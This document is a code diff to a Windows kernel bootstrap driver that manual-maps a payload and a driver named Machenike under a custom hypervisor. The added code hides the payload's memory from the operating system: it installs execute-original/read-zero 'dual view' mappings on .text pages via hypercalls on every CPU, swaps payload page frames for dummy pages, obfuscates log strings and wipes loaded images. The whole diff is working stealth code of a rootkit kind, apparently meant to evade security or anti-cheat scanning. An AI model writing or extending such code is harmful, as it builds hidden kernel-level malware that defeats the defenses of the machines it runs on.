@@ -1,5 +1,6 @@
 ﻿#include "base.h"
 #include "fltKernel.h"
+#include <ntimage.h>
 #include <intrin.h>
 
 #include "Utils.h"
@@ -103,6 +104,23 @@ static bool mapdriver_va_in_range(payload_u64 va, payload_u64 base, payload_u64 
         return false;
 
     return va >= base && end <= range_end;
+}
+
+static bool mapdriver_ranges_overlap(
+    payload_u64 left_base,
+    payload_u64 left_size,
+    payload_u64 right_base,
+    payload_u64 right_size)
+{
+    if (!left_base || !left_size || !right_base || !right_size)
+        return false;
+
+    payload_u64 const left_end = left_base + left_size;
+    payload_u64 const right_end = right_base + right_size;
+    if (left_end < left_base || right_end < right_base)
+        return false;
+
+    return left_base < right_end && right_base < left_end;
 }
 
 static bool mapdriver_va_in_testdriver_image(payload_u64 va, payload_u64 bytes = sizeof(payload_u64))
@@ -1437,20 +1455,25 @@ static bool mapdriver_query_payload_status(payload_status* out)
 
     RtlZeroMemory(out, sizeof(*out));
 
-    // 常驻交接完成后，长期控制链路严禁通过 payload_exports->get_status 在 Guest 模式执行载荷代码。
-    // 必须转由常驻桥接器在 Root-mode 下查询状态；确保载荷映像/跳板页对 Guest 隐藏后状态查询依然可用。
-    if (g_payload_detached && mapdriver_hv_ready())
+    // 只要 Resident HV 已经可用，就优先通过 Root-mode 状态超调用读取。
+    // 这覆盖 Bootstrap 被 DROPCTL 卸载后再次加载的场景：此时新的
+    // Bootstrap 尚未恢复 g_payload_detached / payloadExports，但 ResidentPayload
+    // 仍保存着 Machenike 状态，必须先恢复它再处理 LOAD_MACHENIKE。
+    if (mapdriver_hv_ready())
     {
+        bool root_status_ok = false;
         __try
         {
             payload_u64 result = hv::vmcall_get_payload_status(out, sizeof(*out));
-            return result == PAYLOAD_RESULT_OK && out->magic == PAYLOAD_STATUS_MAGIC;
+            root_status_ok = result == PAYLOAD_RESULT_OK && out->magic == PAYLOAD_STATUS_MAGIC;
         }
         __except (EXCEPTION_EXECUTE_HANDLER)
         {
-            RtlZeroMemory(out, sizeof(*out));
-            return false;
+            root_status_ok = false;
         }
+        if (root_status_ok)
+            return true;
+        RtlZeroMemory(out, sizeof(*out));
     }
 
     if (!Utils::payloadExports || !Utils::payloadExports->get_status)
@@ -1458,6 +1481,26 @@ static bool mapdriver_query_payload_status(payload_status* out)
 
     payload_u64 result = Utils::payloadExports->get_status(out);
     return result == PAYLOAD_RESULT_OK && out->magic == PAYLOAD_STATUS_MAGIC;
+}
+
+static bool mapdriver_restore_machenike_status_from_payload()
+{
+    payload_status status = {};
+    if (!mapdriver_query_payload_status(&status) ||
+        status.payload_machenike_loaded == 0 ||
+        status.payload_machenike_base == 0 ||
+        status.payload_machenike_size == 0)
+        return false;
+
+    Utils::machenikeBase = reinterpret_cast<PVOID>(status.payload_machenike_base);
+    Utils::machenikeSize = static_cast<ULONG>(status.payload_machenike_size);
+    Utils::machenikeMode = static_cast<ULONG>(status.payload_machenike_mode);
+    Utils::machenikeUsedIndependent = static_cast<BOOLEAN>(status.payload_machenike_used_indep);
+    Utils::machenikeUnload = reinterpret_cast<PDRIVER_UNLOAD>(status.payload_machenike_driver_unload);
+    Utils::machenikeLoaded = TRUE;
+    LOG_DEBUG(_XOR_("[VtBootstrapDriver] restored resident Machenike state base=%p size=0x%X mode=%u\n"),
+        Utils::machenikeBase, Utils::machenikeSize, Utils::machenikeMode);
+    return true;
 }
 
 static payload_u64 mapdriver_set_payload_mode(payload_u64 kind, payload_u64 mode)
@@ -1617,7 +1660,7 @@ static bool mapdriver_payload_pool_block_in_known_hostmap(const payload_status& 
 static bool mapdriver_map_payload_host_pool_blocks(const payload_status& ps,
                                                    const char* phase)
 {
-#if VT_HOSTMAP_CODE_POOLS_ONLY || VT_HOSTMAP_ALL_POOLS
+#if VT_POOLMANAGER_HOSTMAP_RESIDENT_BLOCKS
     if (!ps.resident_pool_manifest || !ps.resident_pool_count)
     {
         LOG_DEBUG(_XOR_("[payload] hostmap pool skipped %s: manifest=0x%llX count=%llu\n"),
@@ -1828,6 +1871,27 @@ static bool mapdriver_log_payload_barrier(const char* phase)
 
 static ULONG mapdriver_hide_range_pfns_chunked(UINT64 base, UINT64 size);
 
+struct mapdriver_payload_text_range
+{
+    UINT64 base;
+    UINT64 size;
+};
+
+static ULONG mapdriver_collect_payload_text_ranges(
+    UINT64 image_base,
+    UINT64 image_size,
+    mapdriver_payload_text_range* ranges,
+    ULONG max_ranges);
+
+static ULONG mapdriver_install_payload_text_dual_view(UINT64 image_base, UINT64 image_size);
+static ULONG mapdriver_remove_payload_text_dual_view(UINT64 image_base, UINT64 image_size);
+static ULONG mapdriver_note_payload_text_pfns(
+    UINT64* pfns,
+    ULONG max_count,
+    ULONG* count,
+    UINT64 image_base,
+    UINT64 image_size);
+
 static void mapdriver_hide_payload_memory(const char* phase)
 {
 #if VT_HIDE_PAYLOAD_ENABLED
@@ -1845,18 +1909,45 @@ static void mapdriver_hide_payload_memory(const char* phase)
     }
 
     ULONG pfn_count = 0;
+    ULONG text_dual_view_pages = 0;
 #if VT_HIDE_PAYLOAD_IMAGE
-    pfn_count += mapdriver_hide_range_pfns_chunked(status.image_base, status.image_size);
+    // .text 采用 EH 双视图：执行取原始 PFN，普通读取走全零页。
+    // 不能再把代码页直接改成 dummy PFN，否则 CPU 取指也会读取全零并执行 0x00。
+    text_dual_view_pages = mapdriver_install_payload_text_dual_view(status.image_base, status.image_size);
+    pfn_count += text_dual_view_pages;
 #endif
 #if VT_HIDE_PAYLOAD_ARENA
-    pfn_count += mapdriver_hide_range_pfns_chunked(status.arena_base, status.arena_size);
+    if (!mapdriver_ranges_overlap(
+            status.arena_base,
+            status.arena_size,
+            status.image_base,
+            status.image_size))
+    {
+        pfn_count += mapdriver_hide_range_pfns_chunked(status.arena_base, status.arena_size);
+    }
+    else
+    {
+        LOG_DEBUG(_XOR_("[payload] arena hide skipped %s: overlaps image range\n"), phase);
+    }
 #endif
 #if VT_HIDE_PAYLOAD_DIRECT
-    pfn_count += mapdriver_hide_range_pfns_chunked(status.direct_alloc_base, status.direct_alloc_size);
+    if (!mapdriver_ranges_overlap(
+            status.direct_alloc_base,
+            status.direct_alloc_size,
+            status.image_base,
+            status.image_size))
+    {
+        pfn_count += mapdriver_hide_range_pfns_chunked(status.direct_alloc_base, status.direct_alloc_size);
+    }
+    else
+    {
+        LOG_DEBUG(_XOR_("[payload] direct hide skipped %s: overlaps image range\n"), phase);
+    }
 #endif
 
-    LOG_DEBUG(_XOR_("[payload] hide %s pfns=%lu image=0x%llX/0x%llX arena=0x%llX/0x%llX direct=0x%llX/0x%llX\n"),
+    LOG_DEBUG(_XOR_("[payload] hide %s text_dual_view_pages=%lu pfns=%lu image=0x%llX/0x%llX arena=0x%llX/0x%llX direct=0x%llX/0x%llX\n"),
         phase,
+        text_dual_view_pages,
         pfn_count,
         status.image_base,
         status.image_size,
@@ -1888,6 +1979,12 @@ static void mapdriver_hide_payload_arena_used(const char* phase)
     {
         LOG_DEBUG(_XOR_("[payload] arena hide skipped %s: arena=0x%llX size=0x%llX used=0x%llX\n"),
             phase, arena_base, arena_size, arena_used);
+        return;
+    }
+
+    if (mapdriver_ranges_overlap(arena_base, arena_size, status.image_base, status.image_size))
+    {
+        LOG_DEBUG(_XOR_("[payload] arena hide skipped %s: overlaps image range\n"), phase);
         return;
     }
 
@@ -2056,6 +2153,246 @@ static ULONG mapdriver_hide_range_pfns_chunked(UINT64 base, UINT64 size)
 #endif
 }
 
+static ULONG mapdriver_collect_payload_text_ranges(
+    UINT64 image_base,
+    UINT64 image_size,
+    mapdriver_payload_text_range* ranges,
+    ULONG max_ranges)
+{
+    if (!image_base || !image_size || !ranges || !max_ranges ||
+        image_size < sizeof(IMAGE_DOS_HEADER))
+        return 0;
+
+    ULONG count = 0;
+    __try
+    {
+        UINT64 const base = image_base;
+        auto dos = reinterpret_cast<PIMAGE_DOS_HEADER>(base);
+        if (dos->e_magic != IMAGE_DOS_SIGNATURE ||
+            dos->e_lfanew < (LONG)sizeof(IMAGE_DOS_HEADER))
+            return 0;
+
+        UINT64 const nt_offset = (UINT64)(ULONG)dos->e_lfanew;
+        if (nt_offset > image_size - sizeof(IMAGE_NT_HEADERS64))
+            return 0;
+
+        auto nt = reinterpret_cast<PIMAGE_NT_HEADERS64>(base + nt_offset);
+        if (nt->Signature != IMAGE_NT_SIGNATURE ||
+            nt->OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR64_MAGIC)
+            return 0;
+
+        ULONG const section_count = nt->FileHeader.NumberOfSections;
+        if (!section_count || section_count > 96)
+            return 0;
+
+        UINT64 const section_offset = nt_offset + sizeof(ULONG) + sizeof(IMAGE_FILE_HEADER) +
+            nt->FileHeader.SizeOfOptionalHeader;
+        UINT64 const section_bytes = (UINT64)section_count * sizeof(IMAGE_SECTION_HEADER);
+        if (section_offset > image_size || section_bytes > image_size - section_offset)
+            return 0;
+
+        auto sections = IMAGE_FIRST_SECTION(nt);
+        for (ULONG i = 0; i < section_count; ++i)
+        {
+            auto const& section = sections[i];
+            if (!(section.Characteristics & IMAGE_SCN_MEM_EXECUTE) ||
+                RtlCompareMemory(section.Name, ".text", 5) != 5)
+                continue;
+
+            ULONG const section_size = section.Misc.VirtualSize ?
+                section.Misc.VirtualSize : section.SizeOfRawData;
+            UINT64 const section_rva = section.VirtualAddress;
+            if (!section_size || section_rva >= image_size ||
+                (UINT64)section_size > image_size - section_rva)
+                continue;
+
+            UINT64 const raw_begin = base + section_rva;
+            UINT64 const raw_end = raw_begin + section_size;
+            if (raw_end < raw_begin || raw_begin > ~0ull - (PAGE_SIZE - 1))
+                continue;
+
+            // PFN 隐藏是 4KB 粒度；跳过与相邻节混合的首尾页，保证 .data/.rdata 不被连带隐藏。
+            UINT64 const begin = (raw_begin + PAGE_SIZE - 1) & ~(UINT64)(PAGE_SIZE - 1);
+            UINT64 const end = raw_end & ~(UINT64)(PAGE_SIZE - 1);
+            if (end <= begin)
+                continue;
+            if (count >= max_ranges)
+                return 0;
+
+            ranges[count].base = begin;
+            ranges[count].size = end - begin;
+            ++count;
+            return count;
+        }
+    }
+    __except (EXCEPTION_EXECUTE_HANDLER)
+    {
+        count = 0;
+    }
+
+    return count;
+}
+
+static bool mapdriver_payload_text_dual_view_vmcall_all(
+    hv::hypercall_code code,
+    UINT64 va)
+{
+#if VT_HIDE_PAYLOAD_ENABLED && VT_HIDE_PAYLOAD_IMAGE
+    if (!va || !mapdriver_hv_ready())
+        return false;
+
+    ULONG attempted = 0;
+    ULONG succeeded = 0;
+    USHORT const group_count = KeQueryActiveGroupCount();
+    for (USHORT group = 0; group < group_count; ++group)
+    {
+        ULONG const processors = KeQueryActiveProcessorCountEx(group);
+        for (ULONG cpu = 0; cpu < processors && cpu < 64; ++cpu)
+        {
+            GROUP_AFFINITY affinity = {};
+            affinity.Group = group;
+            affinity.Mask = 1ull << cpu;
+            GROUP_AFFINITY previous = {};
+            KeSetSystemGroupAffinityThread(&affinity, &previous);
+
+            hv::hypercall_input input = {};
+            input.code = code;
+            input.key = hv::hypercall_key;
+            input.args[0] = 0; // 内核地址使用 system_cr3 解析
+            input.args[1] = va;
+            if (code == hv::hypercall_eh_install)
+                input.args[2] = 3; // full_zero + is_fake_page
+
+            UINT64 result = 0;
+            bool const call_ok = hv::try_vmcall(input, &result);
+            KeRevertToUserGroupAffinityThread(&previous);
+
+            ++attempted;
+            if (call_ok && result != 0)
+                ++succeeded;
+        }
+    }
+
+    return attempted != 0 && succeeded == attempted;
+#else
+    UNREFERENCED_PARAMETER(code);
+    UNREFERENCED_PARAMETER(va);
+    return true;
+#endif
+}
+
+static ULONG mapdriver_install_payload_text_dual_view(UINT64 image_base, UINT64 image_size)
+{
+#if VT_HIDE_PAYLOAD_ENABLED && VT_HIDE_PAYLOAD_IMAGE
+    mapdriver_payload_text_range ranges[16] = {};
+    ULONG const range_count = mapdriver_collect_payload_text_ranges(
+        image_base, image_size, ranges, RTL_NUMBER_OF(ranges));
+    ULONG installed = 0;
+
+    for (ULONG i = 0; i < range_count; ++i)
+    {
+        UINT64 const end = ranges[i].base + ranges[i].size;
+        if (end < ranges[i].base)
+            return 0;
+
+        for (UINT64 page = ranges[i].base; page < end; page += PAGE_SIZE)
+        {
+            if (mapdriver_payload_text_dual_view_vmcall_all(
+                    hv::hypercall_eh_install,
+                    page))
+            {
+                ++installed;
+                continue;
+            }
+
+            // 全核安装必须原子化；当前页失败时回滚已经装好的页。
+            for (ULONG rollback_range = 0; rollback_range <= i; ++rollback_range)
+            {
+                UINT64 const rollback_end = ranges[rollback_range].base + ranges[rollback_range].size;
+                UINT64 const rollback_limit = rollback_range == i ? page : rollback_end;
+                for (UINT64 rollback_page = ranges[rollback_range].base;
+                    rollback_page < rollback_limit;
+                    rollback_page += PAGE_SIZE)
+                {
+                    mapdriver_payload_text_dual_view_vmcall_all(
+                        hv::hypercall_eh_remove,
+                        rollback_page);
+                }
+            }
+
+            LOG_DEBUG(_XOR_("[payload] .text dual-view install failed page=%p installed=%lu\n"),
+                (PVOID)page,
+                installed);
+            return 0;
+        }
+    }
+
+    if (installed)
+    {
+        LOG_DEBUG(_XOR_("[payload] .text dual-view active pages=%lu mode=execute-original/read-zero\n"),
+            installed);
+    }
+    return installed;
+#else
+    UNREFERENCED_PARAMETER(image_base);
+    UNREFERENCED_PARAMETER(image_size);
+    return 0;
+#endif
+}
+
+static ULONG mapdriver_remove_payload_text_dual_view(UINT64 image_base, UINT64 image_size)
+{
+#if VT_HIDE_PAYLOAD_ENABLED && VT_HIDE_PAYLOAD_IMAGE
+    mapdriver_payload_text_range ranges[16] = {};
+    ULONG const range_count = mapdriver_collect_payload_text_ranges(
+        image_base, image_size, ranges, RTL_NUMBER_OF(ranges));
+    ULONG removed = 0;
+    for (ULONG i = 0; i < range_count; ++i)
+    {
+        UINT64 const end = ranges[i].base + ranges[i].size;
+        if (end < ranges[i].base)
+            continue;
+        for (UINT64 page = ranges[i].base; page < end; page += PAGE_SIZE)
+        {
+            if (mapdriver_payload_text_dual_view_vmcall_all(
+                    hv::hypercall_eh_remove,
+                    page))
+            {
+                ++removed;
+            }
+        }
+    }
+
+    LOG_DEBUG(_XOR_("[payload] .text dual-view removed pages=%lu\n"), removed);
+    return removed;
+#else
+    UNREFERENCED_PARAMETER(image_base);
+    UNREFERENCED_PARAMETER(image_size);
+    return 0;
+#endif
+}
+
+#if VT_HIDE_PAYLOAD_ENABLED
+static ULONG mapdriver_note_payload_text_pfns(
+    UINT64* pfns,
+    ULONG max_count,
+    ULONG* count,
+    UINT64 image_base,
+    UINT64 image_size)
+{
+    if (!pfns || !max_count || !count)
+        return 0;
+
+    mapdriver_payload_text_range ranges[16] = {};
+    ULONG const range_count = mapdriver_collect_payload_text_ranges(
+        image_base, image_size, ranges, RTL_NUMBER_OF(ranges));
+    ULONG const before = *count;
+    for (ULONG i = 0; i < range_count; ++i)
+        mapdriver_note_range_pfns(pfns, max_count, count, ranges[i].base, ranges[i].size);
+    return *count - before;
+}
+#endif
+
 static void mapdriver_hide_payload_arena_full(const char* phase)
 {
 #if VT_HIDE_PAYLOAD_ENABLED
@@ -2074,6 +2411,12 @@ static void mapdriver_hide_payload_arena_full(const char* phase)
     {
         LOG_DEBUG(_XOR_("[payload] full arena hide skipped %s: arena=0x%llX size=0x%llX\n"),
             phase, arena_base, arena_size);
+        return;
+    }
+
+    if (mapdriver_ranges_overlap(arena_base, arena_size, status.image_base, status.image_size))
+    {
+        LOG_DEBUG(_XOR_("[payload] full arena hide skipped %s: overlaps image range\n"), phase);
         return;
     }
 
@@ -2099,6 +2442,16 @@ static void mapdriver_hide_payload_host_stack(const char* phase)
         return;
     }
 
+    if (mapdriver_ranges_overlap(
+            status.host_stack_base,
+            status.host_stack_size,
+            status.image_base,
+            status.image_size))
+    {
+        LOG_DEBUG(_XOR_("[payload] host stack hide skipped %s: overlaps image range\n"), phase);
+        return;
+    }
+
     ULONG pfns = mapdriver_hide_range_pfns_chunked(
         status.host_stack_base,
         status.host_stack_size);
@@ -2114,7 +2467,7 @@ static void mapdriver_hide_payload_host_stack(const char* phase)
 
 static void mapdriver_hide_payload_resident_pool_blocks(const char* phase)
 {
-#if VT_HIDE_PAYLOAD_ENABLED
+#if VT_POOLMANAGER_HIDE_RESIDENT_BLOCKS
     payload_status status = {};
     if (!mapdriver_query_payload_status(&status) ||
         status.magic != PAYLOAD_STATUS_MAGIC ||
@@ -2152,6 +2505,7 @@ static void mapdriver_hide_payload_resident_pool_blocks(const char* phase)
         phase,
         "hide");
     payload_u64 block_count = 0;
+    payload_u64 image_skip_count = 0;
     payload_u64 bytes = 0;
     ULONG pfn_count = 0;
 
@@ -2162,6 +2516,17 @@ static void mapdriver_hide_payload_resident_pool_blocks(const char* phase)
             payload_pool_block b = blocks[i];
             if (!b.va || !b.bytes)
                 continue;
+            if (mapdriver_ranges_overlap(
+                    b.va,
+                    b.bytes,
+                    status.image_base,
+                    status.image_size))
+            {
+                // PoolManager 也登记了 Payload 映像本身。该块必须跳过，
+                // 否则后置 PFN→dummy 会覆盖 .text EH 双视图并让 CPU 取零执行。
+                ++image_skip_count;
+                continue;
+            }
             block_count++;
             bytes += b.bytes;
             pfn_count += mapdriver_hide_range_pfns_chunked(b.va, b.bytes);
@@ -2175,9 +2540,10 @@ static void mapdriver_hide_payload_resident_pool_blocks(const char* phase)
             block_count);
     }
 
-    LOG_DEBUG(_XOR_("[payload] resident pool hide %s blocks=%llu pfns=%lu bytes=0x%llX manifest=0x%llX indep=%llu fallback=%llu\n"),
+    LOG_DEBUG(_XOR_("[payload] resident pool hide %s blocks=%llu image_skip=%llu pfns=%lu bytes=0x%llX manifest=0x%llX indep=%llu fallback=%llu\n"),
         phase,
         block_count,
+        image_skip_count,
         pfn_count,
         bytes,
         status.resident_pool_manifest,
@@ -2213,7 +2579,8 @@ static ULONG mapdriver_collect_payload_pfns(UINT64* pfns, ULONG max_count, paylo
     if (have_status && status.magic == PAYLOAD_STATUS_MAGIC)
     {
 #if VT_HIDE_PAYLOAD_IMAGE
-        mapdriver_note_range_pfns(pfns, max_count, &pfn_count, status.image_base, status.image_size);
+        mapdriver_note_payload_text_pfns(
+            pfns, max_count, &pfn_count, status.image_base, status.image_size);
 #endif
 #if VT_HIDE_FULL_ARENA || VT_HIDE_PAYLOAD_ARENA
         mapdriver_note_range_pfns(pfns, max_count, &pfn_count, status.arena_base, status.arena_size);
@@ -2223,6 +2590,7 @@ static ULONG mapdriver_collect_payload_pfns(UINT64* pfns, ULONG max_count, paylo
 #endif
         mapdriver_note_range_pfns(pfns, max_count, &pfn_count, status.host_stack_base, status.host_stack_size);
 
+#if VT_POOLMANAGER_HIDE_RESIDENT_BLOCKS
         if (status.resident_pool_manifest && status.resident_pool_count)
         {
             auto blocks = (payload_pool_block*)ExAllocatePoolWithTag(
@@ -2242,6 +2610,14 @@ static ULONG mapdriver_collect_payload_pfns(UINT64* pfns, ULONG max_count, paylo
                     for (payload_u64 i = 0; i < count; ++i)
                     {
                         payload_pool_block b = blocks[i];
+                        if (mapdriver_ranges_overlap(
+                                b.va,
+                                b.bytes,
+                                status.image_base,
+                                status.image_size))
+                        {
+                            continue;
+                        }
                         mapdriver_note_range_pfns(pfns, max_count, &pfn_count, b.va, b.bytes);
                     }
                 }
@@ -2260,10 +2636,16 @@ static ULONG mapdriver_collect_payload_pfns(UINT64* pfns, ULONG max_count, paylo
                 LOG_DEBUG(_XOR_("[payload] collect resident pool pfns skipped: snapshot alloc failed\n"));
             }
         }
+#endif
     }
     else
     {
-        mapdriver_note_range_pfns(pfns, max_count, &pfn_count, (UINT64)Utils::payloadBase, Utils::payloadSize);
+        mapdriver_note_payload_text_pfns(
+            pfns,
+            max_count,
+            &pfn_count,
+            (UINT64)Utils::payloadBase,
+            Utils::payloadSize);
         mapdriver_note_range_pfns(pfns, max_count, &pfn_count, (UINT64)Utils::payloadArenaBase, Utils::payloadArenaSize);
     }
 
@@ -2280,6 +2662,25 @@ static mapdriver_unhide_stats mapdriver_unhide_payload_memory(const char* phase)
         LOG_DEBUG(_XOR_("[payload] unhide skipped %s: hv not ready\n"), phase);
         return stats;
     }
+
+#if VT_HIDE_PAYLOAD_IMAGE
+    // 先摘除代码页双视图，再申请大块 PFN 缓冲；即使后续分配失败，也不能
+    // 留下指向已释放 Payload 的 EH 条目。
+    payload_status early_status = {};
+    if (mapdriver_query_payload_status(&early_status) &&
+        early_status.magic == PAYLOAD_STATUS_MAGIC)
+    {
+        mapdriver_remove_payload_text_dual_view(
+            early_status.image_base,
+            early_status.image_size);
+    }
+    else
+    {
+        mapdriver_remove_payload_text_dual_view(
+            (UINT64)Utils::payloadBase,
+            Utils::payloadSize);
+    }
+#endif
 
     // Must cover image/direct/full-arena/host-stack plus adopted PoolManager
     // independent blocks.  内存池块s alone can exceed 70K pages, so keep this
@@ -2514,9 +2915,6 @@ static bool mapdriver_load_resident_payload(bool configure_vmexit = true)
         Utils::payloadArenaBase = nullptr;
         Utils::payloadArenaSize = 0;
     }
-#if VT_IMAGE_WIPE_ENABLED
-    RtlSecureZeroMemory(payload_image_blob, sizeof(payload_image_blob));
-#endif
     return ok;
 }
 
@@ -2615,10 +3013,15 @@ struct mapdriver_lifecycle_guard
 
 static bool mapdriver_load_machenike(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath, BOOLEAN isManualMap = FALSE)
 {
+    mapdriver_restore_machenike_status_from_payload();
     if (Utils::machenikeLoaded && Utils::machenikeBase)
     {
-        LOG_DEBUG(_XOR_("[VtBootstrapDriver] Machenike already loaded base=%p size=0x%X mode=%u\n"),
+        LOG_DEBUG(_XOR_("[VtBootstrapDriver] Machenike already loaded; duplicate load skipped base=%p size=0x%X mode=%u\n"),
             Utils::machenikeBase, Utils::machenikeSize, Utils::machenikeMode);
+#if VT_MACHENIKE_TEXT_DUAL_VIEW_ENABLED
+        if (!Utils::InstallMachenikeTextDualView())
+            LOG_DEBUG(_XOR_("[VtBootstrapDriver] Machenike existing image .text dual-view is not active\n"));
+#endif
         return true;
     }
 
@@ -2658,6 +3061,12 @@ static bool mapdriver_load_machenike(PDRIVER_OBJECT DriverObject, PUNICODE_STRIN
 #if VT_IMAGE_WIPE_ENABLED
     if (ok)
         RtlSecureZeroMemory(machenike_sys, sizeof(machenike_sys));
+#endif
+#if VT_MACHENIKE_TEXT_DUAL_VIEW_ENABLED
+    if (ok && !Utils::InstallMachenikeTextDualView())
+    {
+        LOG_DEBUG(_XOR_("[VtBootstrapDriver] Machenike loaded without .text dual-view; stable mode remains visible\n"));
+    }
 #endif
     return ok;
 }
@@ -2820,13 +3229,20 @@ static bool mapdriver_install_resident_bootstrap_unload()
             ack = 0;
         }
 
+        bool const amd_legacy_released =
+            !Utils::imageBase && !Utils::imageSize;
+        bool const amd_legacy_retained_quarantined =
+            Utils::imageBase != nullptr &&
+            Utils::imageSize != 0 &&
+            Utils::testDriverUnloaded != FALSE &&
+            Utils::testDriverImageQuarantined != FALSE;
         if (!check->diag.vcpu_count ||
             ack != check->diag.vcpu_count ||
-            Utils::imageBase ||
-            Utils::imageSize)
+            (!amd_legacy_released && !amd_legacy_retained_quarantined))
         {
-            LOG_DEBUG(_XOR_("[VtBootstrapDriver] bootstrap release blocked AMD ack=%llu/%llu test=%p/0x%X\n"),
-                ack, check->diag.vcpu_count, Utils::imageBase, Utils::imageSize);
+            LOG_DEBUG(_XOR_("[VtBootstrapDriver] bootstrap release blocked AMD ack=%llu/%llu test=%p/0x%X unloaded=%d quarantined=%d\n"),
+                ack, check->diag.vcpu_count, Utils::imageBase, Utils::imageSize,
+                (int)Utils::testDriverUnloaded, (int)Utils::testDriverImageQuarantined);
             goto cleanup;
         }
     }
@@ -3277,7 +3693,21 @@ static void mapdriver_free_resident_pool_blocks_for_unload(mapctl_full_unload* r
     ExFreePoolWithTag(blocks, 'pRfP');
 }
 
-static void mapdriver_full_unload_runtime_locked(mapctl_full_unload* req);
+static __declspec(noinline) void mapdriver_full_unload_runtime_locked(mapctl_full_unload* req);
+
+struct mapdriver_full_unload_callout_context
+{
+    mapctl_full_unload* request;
+};
+
+static __declspec(noinline) VOID mapdriver_full_unload_callout(PVOID parameter)
+{
+    auto const context = static_cast<mapdriver_full_unload_callout_context*>(parameter);
+    if (!context || !context->request)
+        return;
+
+    mapdriver_full_unload_runtime_locked(context->request);
+}
 
 static void mapdriver_full_unload_runtime(mapctl_full_unload* req)
 {
@@ -3300,10 +3730,33 @@ static void mapdriver_full_unload_runtime(mapctl_full_unload* req)
         return;
     }
 
-    mapdriver_full_unload_runtime_locked(req);
+    // FULL_UNLOAD 进入双视图移除、多核 VMCALL、SEH 和日志路径时，
+    // 普通 IOCTL 栈不足以承载混淆字符串临时对象与停止诊断状态。
+    // 只允许在扩展栈执行；扩展失败时保持运行态，交由 Loader 重试。
+    if (KeGetCurrentIrql() > APC_LEVEL)
+    {
+        req->result = PAYLOAD_RESULT_INVALID_CONTEXT;
+        LOG_DEBUG(_XOR_("[VtBootstrapDriver] full_unload rejected at irql=%lu\n"),
+            KeGetCurrentIrql());
+        return;
+    }
+
+    mapdriver_full_unload_callout_context context = { req };
+    NTSTATUS const expand_status = KeExpandKernelStackAndCalloutEx(
+        mapdriver_full_unload_callout,
+        &context,
+        48 * 1024,
+        FALSE,
+        nullptr);
+    if (!NT_SUCCESS(expand_status))
+    {
+        req->result = PAYLOAD_RESULT_INVALID_CONTEXT;
+        LOG_DEBUG(_XOR_("[VtBootstrapDriver] full_unload expand-stack failed 0x%X; runtime kept active\n"),
+            expand_status);
+    }
 }
 
-static void mapdriver_full_unload_runtime_locked(mapctl_full_unload* req)
+static __declspec(noinline) void mapdriver_full_unload_runtime_locked(mapctl_full_unload* req)
 {
     if (!req)
         return;
@@ -3523,9 +3976,10 @@ static void mapdriver_full_unload_runtime_locked(mapctl_full_unload* req)
         req->hv_after = mapdriver_hv_ready() ? 1 : 0;
         req->test_after = (payload_u64)Utils::imageBase;
         req->payload_after = (payload_u64)Utils::payloadBase;
-        req->result = (!req->hv_after) ? PAYLOAD_RESULT_OK : PAYLOAD_RESULT_INVALID_CONTEXT;
-        LOG_DEBUG(_XOR_("[VtBootstrapDriver] full_unload stoptest leave result=0x%llX hv_after=%llu test=%p payload=%p\n"),
-            req->result, req->hv_after, Utils::imageBase, Utils::payloadBase);
+        bool const stop_verified = !req->hv_before || req->stop_result != 0 || req->selfstop_result == PAYLOAD_RESULT_OK;
+        req->result = (!req->hv_after && stop_verified) ? PAYLOAD_RESULT_OK : PAYLOAD_RESULT_INVALID_CONTEXT;
+        LOG_DEBUG(_XOR_("[VtBootstrapDriver] full_unload stoptest leave result=0x%llX hv_after=%llu stop_verified=%d test=%p payload=%p\n"),
+            req->result, req->hv_after, (int)stop_verified, Utils::imageBase, Utils::payloadBase);
         return;
     }
 
@@ -3566,12 +4020,13 @@ static void mapdriver_full_unload_runtime_locked(mapctl_full_unload* req)
     req->test_after = (payload_u64)Utils::imageBase;
     req->payload_after = (payload_u64)Utils::payloadBase;
     req->control_delete_queued = (req->flags & MAPCTL_FULL_UNLOAD_DELETE_CONTROL) ? 1 : 0;
-    req->result = (!req->hv_after && !req->test_after && !req->payload_after)
+    bool const stop_verified = !req->hv_before || req->stop_result != 0 || req->selfstop_result == PAYLOAD_RESULT_OK;
+    req->result = (!req->hv_after && !req->test_after && !req->payload_after && stop_verified)
         ? PAYLOAD_RESULT_OK
         : PAYLOAD_RESULT_INVALID_CONTEXT;
 
-    LOG_DEBUG(_XOR_("[VtBootstrapDriver] full_unload leave result=0x%llX hv_after=%llu test=%p payload=%p delete_ctl=%llu\n"),
-        req->result, req->hv_after, Utils::imageBase, Utils::payloadBase, req->control_delete_queued);
+    LOG_DEBUG(_XOR_("[VtBootstrapDriver] full_unload leave result=0x%llX hv_after=%llu stop_verified=%d test=%p payload=%p delete_ctl=%llu\n"),
+        req->result, req->hv_after, (int)stop_verified, Utils::imageBase, Utils::payloadBase, req->control_delete_queued);
 }
 
 EXTERN_C __declspec(dllexport) VOID unload_driver(PDRIVER_OBJECT DriverObject)
@@ -6616,8 +7071,10 @@ static bool mapdriver_amd_svm_resident_ready(const mapctl_migration_check* last)
         ps.host_stack_desc_base != 0 &&
         ps.host_stack_desc_count >= last->diag.vcpu_count;
     bool const hv_ok = mapdriver_hv_ready();
-    bool const mode_ok = mapdriver_configure_resident_modes();
-    bool const ok = payload_ok && diag_ok && config_ok && hv_ok && mode_ok;
+    // Mode writes are deferred until the caller maps the payload ranges into
+    // the host view.  A fresh AMD bootstrap otherwise reports INVALID_PARAMETER
+    // even though the payload and SVM state are valid.
+    bool const ok = payload_ok && diag_ok && config_ok && hv_ok;
 
     LOG_DEBUG(_XOR_("[VtBootstrapDriver] onekey AMD resident validation ok=%d payload=%d diag=%d config=%d hv=%d modes=%d vcpu=%llu ghv=0x%llX rsp=0x%llX target=0x%llX bridge=0x%llX\n"),
         (int)ok,
@@ -6625,7 +7082,7 @@ static bool mapdriver_amd_svm_resident_ready(const mapctl_migration_check* last)
         (int)diag_ok,
         (int)config_ok,
         (int)hv_ok,
-        (int)mode_ok,
+        1,
         last->diag.vcpu_count,
         last->diag.ghv,
         last->diag.vmcs_host_rsp,
@@ -6724,8 +7181,7 @@ static bool mapdriver_amd_svm_activate_all(const mapctl_hv_diag& diag)
 static bool mapdriver_run_amd_onekey_load(PDRIVER_OBJECT DriverObject,
                                           const mapctl_migration_check& pre)
 {
-    if (!mapdriver_amd_svm_resident_ready(&pre) ||
-        !mapdriver_configure_resident_modes())
+    if (!mapdriver_amd_svm_resident_ready(&pre))
     {
         return false;
     }
